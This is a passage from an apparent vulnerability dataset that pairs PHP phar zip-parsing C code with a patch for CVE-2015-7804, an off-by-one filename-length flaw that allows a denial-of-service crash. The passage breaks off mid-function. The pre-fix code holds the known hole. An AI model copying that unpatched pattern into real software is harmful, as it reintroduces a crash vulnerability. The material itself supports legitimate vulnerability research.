{\n\t\t\t\t/* split archives not handled */\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: split archives spanning multiple zips cannot be processed in zip-based phar \\\"%s\\\"\", fname);\n\t\t\t\t}\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tif (PHAR_GET_16(locator.counthere) != PHAR_GET_16(locator.count)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: corrupt zip archive, conflicting file count in end of central directory record in zip-based phar \\\"%s\\\"\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tmydata = pecalloc(1, sizeof(phar_archive_data), PHAR_G(persist));\n\t\t\tmydata->is_persistent = PHAR_G(persist);\n\n\t\t\t/* read in archive comment, if any */\n\t\t\tif (PHAR_GET_16(locator.comment_len)) {\n\n\t\t\t\tmetadata = p + sizeof(locator);\n\n\t\t\t\tif (PHAR_GET_16(locator.comment_len) != size - (metadata - buf)) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: corrupt zip archive, zip file comment truncated in zip-based phar \\\"%s\\\"\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tpefree(mydata, mydata->is_persistent);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\n\t\t\t\tmydata->metadata_len = PHAR_GET_16(locator.comment_len);\n\n\t\t\t\tif (phar_parse_metadata(&metadata, &mydata->metadata, PHAR_GET_16(locator.comment_len) TSRMLS_CC) == FAILURE) {\n\t\t\t\t\tmydata->metadata_len = 0;\n\t\t\t\t\t/* if not valid serialized data, it is a regular string */\n\n\t\t\t\t\tif (entry.is_persistent) {\n\t\t\t\t\t\tALLOC_PERMANENT_ZVAL(mydata->metadata);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tALLOC_ZVAL(mydata->metadata);\n\t\t\t\t\t}\n\n\t\t\t\t\tINIT_ZVAL(*mydata->metadata);\n\t\t\t\t\tmetadata = pestrndup(metadata, PHAR_GET_16(locator.comment_len), mydata->is_persistent);\n\t\t\t\t\tZVAL_STRINGL(mydata->metadata, metadata, PHAR_GET_16(locator.comment_len), 0);\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tmydata->metadata = NULL;\n\t\t\t}\n\n\t\t\tgoto foundit;\n\t\t}\n\t}\n\n\tphp_stream_close(fp);\n\n\tif (error) {\n\t\tspprintf(error, 4096, \"phar error: end of central directory not found in zip-based phar \\\"%s\\\"\", fname);\n\t}\n\n\treturn FAILURE;\nfoundit:\n\tmydata->fname = pestrndup(fname, fname_len, mydata->is_persistent);\n#ifdef PHP_WIN32\n\tphar_unixify_path_separators(mydata->fname, fname_len);\n#endif\n\tmydata->is_zip = 1;\n\tmydata->fname_len = fname_len;\n\text = strrchr(mydata->fname, '/');\n\n\tif (ext) {\n\t\tmydata->ext = memchr(ext, '.', (mydata->fname + fname_len) - ext);\n\t\tif (mydata->ext == ext) {\n\t\t\tmydata->ext = memchr(ext + 1, '.', (mydata->fname + fname_len) - ext - 1);\n\t\t}\n\t\tif (mydata->ext) {\n\t\t\tmydata->ext_len = (mydata->fname + fname_len) - mydata->ext;\n\t\t}\n\t}\n\n\t/* clean up on big-endian systems */\n\t/* seek to central directory */\n\tphp_stream_seek(fp, PHAR_GET_32(locator.cdir_offset), SEEK_SET);\n\t/* read in central directory */\n\tzend_hash_init(&mydata->manifest, PHAR_GET_16(locator.count),\n\t\tzend_get_hash_value, destroy_phar_manifest_entry, (zend_bool)mydata->is_persistent);\n\tzend_hash_init(&mydata->mounted_dirs, 5,\n\t\tzend_get_hash_value, NULL, (zend_bool)mydata->is_persistent);\n\tzend_hash_init(&mydata->virtual_dirs, PHAR_GET_16(locator.count) * 2,\n\t\tzend_get_hash_value, NULL, (zend_bool)mydata->is_persistent);\n\tentry.phar = mydata;\n\tentry.is_zip = 1;\n\tentry.fp_type = PHAR_FP;\n\tentry.is_persistent = mydata->is_persistent;\n#define PHAR_ZIP_FAIL_FREE(errmsg, save) \\\n\t\t\tzend_hash_destroy(&mydata->manifest); \\\n\t\t\tmydata->manifest.arBuckets = 0; \\\n\t\t\tzend_hash_destroy(&mydata->mounted_dirs); \\\n\t\t\tmydata->mounted_dirs.arBuckets = 0; \\\n\t\t\tzend_hash_destroy(&mydata->virtual_dirs); \\\n\t\t\tmydata->virtual_dirs.arBuckets = 0; \\\n\t\t\tphp_stream_close(fp); \\\n\t\t\tif (mydata->metadata) { \\\n\t\t\t\tzval_dtor(mydata->metadata); \\\n\t\t\t} \\\n\t\t\tif (mydata->signature) { \\\n\t\t\t\tefree(mydata->signature); \\\n\t\t\t} \\\n\t\t\tif (error) { \\\n\t\t\t\tspprintf(error, 4096, \"phar error: %s in zip-based phar \\\"%s\\\"\", errmsg, mydata->fname); \\\n\t\t\t} \\\n\t\t\tpefree(mydata->fname, mydata->is_persistent); \\\n\t\t\tif (mydata->alias) { \\\n\t\t\t\tpefree(mydata->alias, mydata->is_persistent); \\\n\t\t\t} \\\n\t\t\tpefree(mydata, mydata->is_persistent); \\\n\t\t\tefree(save); \\\n\t\t\treturn FAILURE;\n#define PHAR_ZIP_FAIL(errmsg) \\\n\t\t\tzend_hash_destroy(&mydata->manifest); \\\n\t\t\tmydata->manifest.arBuckets = 0; \\\n\t\t\tzend_hash_destroy(&mydata->mounted_dirs); \\\n\t\t\tmydata->mounted_dirs.arBuckets = 0; \\\n\t\t\tzend_hash_destroy(&mydata->virtual_dirs); \\\n\t\t\tmydata->virtual_dirs.arBuckets = 0; \\\n\t\t\tphp_stream_close(fp); \\\n\t\t\tif (mydata->metadata) { \\\n\t\t\t\tzval_dtor(mydata->metadata); \\\n\t\t\t} \\\n\t\t\tif (mydata->signature) { \\\n\t\t\t\tefree(mydata->signature); \\\n\t\t\t} \\\n\t\t\tif (error) { \\\n\t\t\t\tspprintf(error, 4096, \"phar error: %s in zip-based phar \\\"%s\\\"\", errmsg, mydata->fname); \\\n\t\t\t} \\\n\t\t\tpefree(mydata->fname, mydata->is_persistent); \\\n\t\t\tif (mydata->alias) { \\\n\t\t\t\tpefree(mydata->alias, mydata->is_persistent); \\\n\t\t\t} \\\n\t\t\tpefree(mydata, mydata->is_persistent); \\\n\t\t\treturn FAILURE;\n\n\t/* add each central directory item to the manifest */\n\tfor (i = 0; i < PHAR_GET_16(locator.count); ++i) {\n\t\tphar_zip_central_dir_file zipentry;\n\t\toff_t beforeus = php_stream_tell(fp);\n\n\t\tif (sizeof(zipentry) != php_stream_read(fp, (char *) &zipentry, sizeof(zipentry))) {\n\t\t\tPHAR_ZIP_FAIL(\"unable to read central directory entry, truncated\");\n\t\t}\n\n\t\t/* clean up for bigendian systems */\n\t\tif (memcmp(\"PK\\1\\2\", zipentry.signature, 4)) {\n\t\t\t/* corrupted entry */\n\t\t\tPHAR_ZIP_FAIL(\"corrupted central directory entry, no magic signature\");\n\t\t}\n\n\t\tif (entry.is_persistent) {\n\t\t\tentry.manifest_pos = i;\n\t\t}\n\n\t\tentry.compressed_filesize = PHAR_GET_32(zipentry.compsize);\n\t\tentry.uncompressed_filesize = PHAR_GET_32(zipentry.uncompsize);\n\t\tentry.crc32 = PHAR_GET_32(zipentry.crc32);\n\t\t/* do not PHAR_GET_16 either on the next line */\n\t\tentry.timestamp = phar_zip_d2u_time(zipentry.timestamp, zipentry.datestamp);\n\t\tentry.flags = PHAR_ENT_PERM_DEF_FILE;\n\t\tentry.header_offset = PHAR_GET_32(zipentry.offset);\n\t\tentry.offset = entry.offset_abs = PHAR_GET_32(zipentry.offset) + sizeof(phar_zip_file_header) + PHAR_GET_16(zipentry.filename_len) +\n\t\t\tPHAR_GET_16(zipentry.extra_len);\n\n\t\tif (PHAR_GET_16(zipentry.flags) & PHAR_ZIP_FLAG_ENCRYPTED) {\n\t\t\tPHAR_ZIP_FAIL(\"Cannot process encrypted zip files\");\n\t\t}\n\n\t\tif (!PHAR_GET_16(zipentry.filename_len)) {\n\t\t\tPHAR_ZIP_FAIL(\"Cannot process zips created from stdin (zero-length filename)\");\n\t\t}\n\n\t\tentry.filename_len = PHAR_GET_16(zipentry.filename_len);\n\t\tentry.filename = (char *) pemalloc(entry.filename_len + 1, entry.is_persistent);\n\n\t\tif (entry.filename_len != php_stream_read(fp, entry.filename, entry.filename_len)) {\n\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\tPHAR_ZIP_FAIL(\"unable to read in filename from central directory, truncated\");\n\t\t}\n\n\t\tentry.filename[entry.filename_len] = '\\0';\n\n\t\tif (entry.filename[entry.filename_len - 1] == '/') {\n\t\t\tentry.is_dir = 1;\n\t\t\tif(entry.filename_len > 1) {\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t\tentry.flags |= PHAR_ENT_PERM_DEF_DIR;\n\t\t} else {\n\t\t\tentry.is_dir = 0;\n\t\t}\n\n\t\tif (entry.filename_len == sizeof(\".phar/signature.bin\")-1 && !strncmp(entry.filename, \".phar/signature.bin\", sizeof(\".phar/signature.bin\")-1)) {\n\t\t\tsize_t read;\n\t\t\tphp_stream *sigfile;\n\t\t\toff_t now;\n\t\t\tchar *sig;\n\n\t\t\tnow = php_stream_tell(fp);\n\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\tsigfile = php_stream_fopen_tmpfile();\n\t\t\tif (!sigfile) {\n\t\t\t\tPHAR_ZIP_FAIL(\"couldn't open temporary file\");\n\t\t\t}\n\n\t\t\tphp_stream_seek(fp, 0, SEEK_SET);\n\t\t\t/* copy file contents + local headers and zip comment, if any, to be hashed for signature */\n\t\t\tphar_stream_copy_to_stream(fp, sigfile, entry.header_offset, NULL);\n\t\t\t/* seek to central directory */\n\t\t\tphp_stream_seek(fp, PHAR_GET_32(locator.cdir_offset), SEEK_SET);\n\t\t\t/* copy central directory header */\n\t\t\tphar_stream_copy_to_stream(fp, sigfile, beforeus - PHAR_GET_32(locator.cdir_offset), NULL);\n\t\t\tif (metadata) {\n\t\t\t\tphp_stream_write(sigfile, metadata, PHAR_GET_16(locator.comment_len));\n\t\t\t}\n\t\t\tphp_stream_seek(fp, sizeof(phar_zip_file_header) + entry.header_offset + entry.filename_len + PHAR_GET_16(zipentry.extra_len), SEEK_SET);\n\t\t\tsig = (char *) emalloc(entry.uncompressed_filesize);\n\t\t\tread = php_stream_read(fp, sig, entry.uncompressed_filesize);\n\t\t\tif (read != entry.uncompressed_filesize) {\n\t\t\t\tphp_stream_close(sigfile);\n\t\t\t\tefree(sig);\n\t\t\t\tPHAR_ZIP_FAIL(\"signature cannot be read\");\n\t\t\t}\n\t\t\tmydata->sig_flags = PHAR_GET_32(sig);\n\t\t\tif (FAILURE == phar_verify_signature(sigfile, php_stream_tell(sigfile), mydata->sig_flags, sig + 8, entry.uncompressed_filesize - 8, fname, &mydata->signature, &mydata->sig_len, error TSRMLS_CC)) {\n\t\t\t\tefree(sig);\n\t\t\t\tif (error) {\n\t\t\t\t\tchar *save;\n\t\t\t\t\tphp_stream_close(sigfile);\n\t\t\t\t\tspprintf(&save, 4096, \"signature cannot be verified: %s\", *error);\n\t\t\t\t\tefree(*error);\n\t\t\t\t\tPHAR_ZIP_FAIL_FREE(save, save);\n\t\t\t\t} else {\n\t\t\t\t\tphp_stream_close(sigfile);\n\t\t\t\t\tPHAR_ZIP_FAIL(\"signature cannot be verified\");\n\t\t\t\t}\n\t\t\t}\n\t\t\tphp_stream_close(sigfile);\n\t\t\tefree(sig);\n\t\t\t/* signature checked out, let's ensure this is the last file in the phar */\n\t\t\tif (i != PHAR_GET_16(locator.count) - 1) {\n\t\t\t\tPHAR_ZIP_FAIL(\"entries exist after signature, invalid phar\");\n\t\t\t}\n\n\t\t\tcontinue;\n\t\t}\n\n\t\tphar_add_virtual_dirs(mydata, entry.filename, entry.filename_len TSRMLS_CC);\n\n\t\tif (PHAR_GET_16(zipentry.extra_len)) {\n\t\t\toff_t loc = php_stream_tell(fp);\n\t\t\tif (FAILURE == phar_zip_process_extra(fp, &entry, PHAR_GET_16(zipentry.extra_len) TSRMLS_CC)) {\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"Unable to process extra field header for file in central directory\");\n\t\t\t}\n\t\t\tphp_stream_seek(fp, loc + PHAR_GET_16(zipentry.extra_len), SEEK_SET);\n\t\t}\n\n\t\tswitch (PHAR_GET_16(zipentry.compressed)) {\n\t\t\tcase PHAR_ZIP_COMP_NONE :\n\t\t\t\t/* compression flag already set */\n\t\t\t\tbreak;\n\t\t\tcase PHAR_ZIP_COMP_DEFLATE :\n\t\t\t\tentry.flags |= PHAR_ENT_COMPRESSED_GZ;\n\t\t\t\tif (!PHAR_G(has_zlib)) {\n\t\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\t\tPHAR_ZIP_FAIL(\"zlib extension is required\");\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase PHAR_ZIP_COMP_BZIP2 :\n\t\t\t\tentry.flags |= PHAR_ENT_COMPRESSED_BZ2;\n\t\t\t\tif (!PHAR_G(has_bz2)) {\n\t\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\t\tPHAR_ZIP_FAIL(\"bzip2 extension is required\");\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 1 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (Shrunk) used in this zip\");\n\t\t\tcase 2 :\n\t\t\tcase 3 :\n\t\t\tcase 4 :\n\t\t\tcase 5 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (Reduce) used in this zip\");\n\t\t\tcase 6 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (Implode) used in this zip\");\n\t\t\tcase 7 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (Tokenize) used in this zip\");\n\t\t\tcase 9 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (Deflate64) used in this zip\");\n\t\t\tcase 10 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (PKWare Implode/old IBM TERSE) used in this zip\");\n\t\t\tcase 14 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (LZMA) used in this zip\");\n\t\t\tcase 18 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (IBM TERSE) used in this zip\");\n\t\t\tcase 19 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (IBM LZ77) used in this zip\");\n\t\t\tcase 97 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (WavPack) used in this zip\");\n\t\t\tcase 98 :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (PPMd) used in this zip\");\n\t\t\tdefault :\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unsupported compression method (unknown) used in this zip\");\n\t\t}\n\n\t\t/* get file metadata */\n\t\tif (PHAR_GET_16(zipentry.comment_len)) {\n\t\t\tif (PHAR_GET_16(zipentry.comment_len) != php_stream_read(fp, buf, PHAR_GET_16(zipentry.comment_len))) {\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"unable to read in file comment, truncated\");\n\t\t\t}\n\n\t\t\tp = buf;\n\t\t\tentry.metadata_len = PHAR_GET_16(zipentry.comment_len);\n\n\t\t\tif (phar_parse_metadata(&p, &(entry.metadata), PHAR_GET_16(zipentry.comment_len) TSRMLS_CC) == FAILURE) {\n\t\t\t\tentry.metadata_len = 0;\n\t\t\t\t/* if not valid serialized data, it is a regular string */\n\n\t\t\t\tif (entry.is_persistent) {\n\t\t\t\t\tALLOC_PERMANENT_ZVAL(entry.metadata);\n\t\t\t\t} else {\n\t\t\t\t\tALLOC_ZVAL(entry.metadata);\n\t\t\t\t}\n\n\t\t\t\tINIT_ZVAL(*entry.metadata);\n\t\t\t\tZVAL_STRINGL(entry.metadata, pestrndup(buf, PHAR_GET_16(zipentry.comment_len), entry.is_persistent), PHAR_GET_16(zipentry.comment_len), 0);\n\t\t\t}\n\t\t} else {\n\t\t\tentry.metadata = NULL;\n\t\t}\n\n\t\tif (!actual_alias && entry.filename_len == sizeof(\".phar/alias.txt\")-1 && !strncmp(entry.filename, \".phar/alias.txt\", sizeof(\".phar/alias.txt\")-1)) {\n\t\t\tphp_stream_filter *filter;\n\t\t\toff_t saveloc;\n\t\t\t/* verify local file header */\n\t\t\tphar_zip_file_header local;\n\n\t\t\t/* archive alias found */\n\t\t\tsaveloc = php_stream_tell(fp);\n\t\t\tphp_stream_seek(fp, PHAR_GET_32(zipentry.offset), SEEK_SET);\n\n\t\t\tif (sizeof(local) != php_stream_read(fp, (char *) &local, sizeof(local))) {\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"phar error: internal corruption of zip-based phar (cannot read local file header for alias)\");\n\t\t\t}\n\n\t\t\t/* verify local header */\n\t\t\tif (entry.filename_len != PHAR_GET_16(local.filename_len) || entry.crc32 != PHAR_GET_32(local.crc32) || entry.uncompressed_filesize != PHAR_GET_32(local.uncompsize) || entry.compressed_filesize != PHAR_GET_32(local.compsize)) {\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tPHAR_ZIP_FAIL(\"phar error: internal corruption of zip-based phar (local header of alias does not match central directory)\");\n\t\t\t}\n\n\t\t\t/* construct actual offset to file start - local extra_len can be different from central extra_len */\n\t\t\tentry.offset = entry.offset_abs =\n\t\t\t\tsizeof(local) + entry.header_offset + PHAR_GET_16(local.filename_len) + PHAR_GET_16(local.extra_len);\n\t\t\tphp_stream_seek(fp, entry.offset, SEEK_SET);\n\t\t\t/* these next lines should be for php < 5.2.6 after 5.3 filters are fixed */\n\t\t\tfp->writepos = 0;\n\t\t\tfp->readpos = 0;\n\t\t\tphp_stream_seek(fp, entry.offset, SEEK_SET);\n\t\t\tfp->writepos = 0;\n\t\t\tfp->readpos = 0;\n\t\t\t/* the above lines should be for php < 5.2.6 after 5.3 filters are fixed */\n\n\t\t\tmydata->alias_len = entry.uncompressed_filesize;\n\n\t\t\tif (entry.flags & PHAR_ENT_COMPRESSED_GZ) {\n\t\t\t\tfilter = php_stream_filter_create(\"zlib.inflate\", NULL, php_stream_is_persistent(fp) TSRMLS_CC);\n\n\t\t\t\tif (!filter) {\n\t\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\t\tPHAR_ZIP_FAIL(\"unable to decompress alias, zlib filter creation failed\");\n\t\t\t\t}\n\n\t\t\t\tphp_stream_filter_append(&fp->readfilters, filter);\n\n\t\t\t\tif (!(entry.uncompressed_filesize = php_stream_copy_to_mem(fp, &actual_alias, entry.uncompressed_filesize, 0)) || !actual_alias) {\n\t\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\t\tPHAR_ZIP_FAIL(\"unable to read in alias, truncated\");\n\t\t\t\t}\n\n\t\t\t\tphp_stream_filter_flush(filter, 1);\n\t\t\t\tphp_stream_filter_remove(filter, 1 TSRMLS_CC);\n\n\t\t\t} else if (entry.flags & PHAR_ENT_COMPRESSED_BZ2) {\n\t\t\t\tfilter = php_stream_filter_create(\"bzip2.decompress\", NULL, php_stream_is_persistent(fp) TSRMLS_CC);\n\n\t\t\t\tif (!filter) {\n\t\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\t\tPHAR_ZIP_FAIL(\"unable to read in alias, bzip2 filter creation failed\");\n\t\t\t\t}\n\n\t\t\t\tphp_stream_filter_append(&fp->readfilters, filter);\n\n\t\t\t\tif (!(entry.uncompressed_filesize = php_stream_copy_to_mem(fp, &actual_alias, entry.uncompressed_filesize, 0)) || !actual_alias) {\n\t\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\t\tPHAR_ZIP_FAIL(\"unable to read in alias, truncated\");\n\t\t\t\t}\n\n\t\t\t\tphp_stream_filter_flush(filter, 1);\n\t\t\t\tphp_stream_filter_remove(filter, 1 TSRMLS_CC);\n\t\t\t} else {\n\t\t\t\tif (!(entry.uncompressed_filesize = php_stream_copy_to_mem(fp, &actual_alias, entry.uncompressed_filesize, 0)) || !actual_alias) {\n\t\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\t\tPHAR_ZIP_FAIL(\"unable to read in alias, truncated\");\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t/* return to central directory parsing */\n\t\t\tphp_stream_seek(fp, saveloc, SEEK_SET);\n\t\t}\n\n\t\tphar_set_inode(&entry TSRMLS_CC);\n\t\tzend_hash_add(&mydata->manifest, entry.filename, entry.filename_len, (void *)&entry,sizeof(phar_entry_info), NULL);\n\t}\n\n\tmydata->fp = fp;\n\n\tif (zend_hash_exists(&(mydata->manifest), \".phar/stub.php\", sizeof(\".phar/stub.php\")-1)) {\n\t\tmydata->is_data = 0;\n\t} else {\n\t\tmydata->is_data = 1;\n\t}\n\n\tzend_hash_add(&(PHAR_GLOBALS->phar_fname_map), mydata->fname, fname_len, (void*)&mydata, sizeof(phar_archive_data*), NULL);\n\n\tif (actual_alias) {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tif (!phar_validate_alias(actual_alias, mydata->alias_len)) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: invalid alias \\\"%s\\\" in zip-based phar \\\"%s\\\"\", actual_alias, fname);\n\t\t\t}\n\t\t\tefree(actual_alias);\n\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), mydata->fname, fname_len);\n\t\t\treturn FAILURE;\n\t\t}\n\n\t\tmydata->is_temporary_alias = 0;\n\n\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), actual_alias, mydata->alias_len, (void **)&fd_ptr)) {\n\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, actual_alias, mydata->alias_len TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add zip-based phar \\\"%s\\\" with implicit alias, alias is already in use\", fname);\n\t\t\t\t}\n\t\t\t\tefree(actual_alias);\n\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), mydata->fname, fname_len);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tmydata->alias = entry.is_persistent ? pestrndup(actual_alias, mydata->alias_len, 1) : actual_alias;\n\n\t\tif (entry.is_persistent) {\n\t\t\tefree(actual_alias);\n\t\t}\n\n\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), actual_alias, mydata->alias_len, (void*)&mydata, sizeof(phar_archive_data*), NULL);\n\t} else {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tif (alias_len) {\n\t\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void **)&fd_ptr)) {\n\t\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, alias, alias_len TSRMLS_CC)) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add zip-based phar \\\"%s\\\" with explicit alias, alias is already in use\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), mydata->fname, fname_len);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), actual_alias, mydata->alias_len, (void*)&mydata, sizeof(phar_archive_data*), NULL);\n\t\t\tmydata->alias = pestrndup(alias, alias_len, mydata->is_persistent);\n\t\t\tmydata->alias_len = alias_len;\n\t\t} else {\n\t\t\tmydata->alias = pestrndup(mydata->fname, fname_len, mydata->is_persistent);\n\t\t\tmydata->alias_len = fname_len;\n\t\t}\n\n\t\tmydata->is_temporary_alias = 1;\n\t}\n\n\tif (pphar) {\n\t\t*pphar = mydata;\n\t}\n\n\treturn SUCCESS;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -231,7 +231,9 @@\n \n \t\tif (entry.filename[entry.filename_len - 1] == '/') {\n \t\t\tentry.is_dir = 1;\n-\t\t\tentry.filename_len--;\n+\t\t\tif(entry.filename_len > 1) {\n+\t\t\t\tentry.filename_len--;\n+\t\t\t}\n \t\t\tentry.flags |= PHAR_ENT_PERM_DEF_DIR;\n \t\t} else {\n \t\t\tentry.is_dir = 0;",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\tentry.filename_len--;"
            ],
            "added_lines": [
                "\t\t\tif(entry.filename_len > 1) {",
                "\t\t\t\tentry.filename_len--;",
                "\t\t\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-7804",
        "func_name": "php/php-src/phar_make_dirstream",
        "description": "Off-by-one error in the phar_parse_zipfile function in ext/phar/zip.c in PHP before 5.5.30 and 5.6.x before 5.6.14 allows remote attackers to cause a denial of service (uninitialized pointer dereference and application crash) by including the / filename in a .zip PHAR archive.",
        "git_url": "https://github.com/php/php-src/commit/1ddf72180a52d247db88ea42a3e35f824a8fbda1",
        "commit_title": "Better fix for bug #70433",
        "commit_text": "",
        "func_before": "static php_stream *phar_make_dirstream(char *dir, HashTable *manifest TSRMLS_DC) /* {{{ */\n{\n\tHashTable *data;\n\tint dirlen = strlen(dir);\n\tphar_zstr key;\n\tchar *entry, *found, *save, *str_key;\n\tuint keylen;\n\tulong unused;\n\n\tALLOC_HASHTABLE(data);\n\tzend_hash_init(data, 64, zend_get_hash_value, NULL, 0);\n\n\tif ((*dir == '/' && dirlen == 1 && (manifest->nNumOfElements == 0)) || (dirlen >= sizeof(\".phar\")-1 && !memcmp(dir, \".phar\", sizeof(\".phar\")-1))) {\n\t\t/* make empty root directory for empty phar */\n\t\t/* make empty directory for .phar magic directory */\n\t\tefree(dir);\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t}\n\n\tzend_hash_internal_pointer_reset(manifest);\n\n\twhile (FAILURE != zend_hash_has_more_elements(manifest)) {\n\t\tif (HASH_KEY_IS_STRING != zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {\n\t\t\tbreak;\n\t\t}\n\n\t\tPHAR_STR(key, str_key);\n\n\t\tif (keylen <= (uint)dirlen) {\n\t\t\tif (keylen < (uint)dirlen || !strncmp(str_key, dir, dirlen)) {\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\tif (*dir == '/') {\n\t\t\t/* root directory */\n\t\t\tif (keylen >= sizeof(\".phar\")-1 && !memcmp(str_key, \".phar\", sizeof(\".phar\")-1)) {\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\t/* do not add any magic entries to this directory */\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tif (NULL != (found = (char *) memchr(str_key, '/', keylen))) {\n\t\t\t\t/* the entry has a path separator and is a subdirectory */\n\t\t\t\tentry = (char *) safe_emalloc(found - str_key, 1, 1);\n\t\t\t\tmemcpy(entry, str_key, found - str_key);\n\t\t\t\tkeylen = found - str_key;\n\t\t\t\tentry[keylen] = '\\0';\n\t\t\t} else {\n\t\t\t\tentry = (char *) safe_emalloc(keylen, 1, 1);\n\t\t\t\tmemcpy(entry, str_key, keylen);\n\t\t\t\tentry[keylen] = '\\0';\n\t\t\t}\n\n\t\t\tPHAR_STR_FREE(str_key);\n\t\t\tgoto PHAR_ADD_ENTRY;\n\t\t} else {\n\t\t\tif (0 != memcmp(str_key, dir, dirlen)) {\n\t\t\t\t/* entry in directory not found */\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t} else {\n\t\t\t\tif (str_key[dirlen] != '/') {\n\t\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tsave = str_key;\n\t\tsave += dirlen + 1; /* seek to just past the path separator */\n\n\t\tif (NULL != (found = (char *) memchr(save, '/', keylen - dirlen - 1))) {\n\t\t\t/* is subdirectory */\n\t\t\tsave -= dirlen + 1;\n\t\t\tentry = (char *) safe_emalloc(found - save + dirlen, 1, 1);\n\t\t\tmemcpy(entry, save + dirlen + 1, found - save - dirlen - 1);\n\t\t\tkeylen = found - save - dirlen - 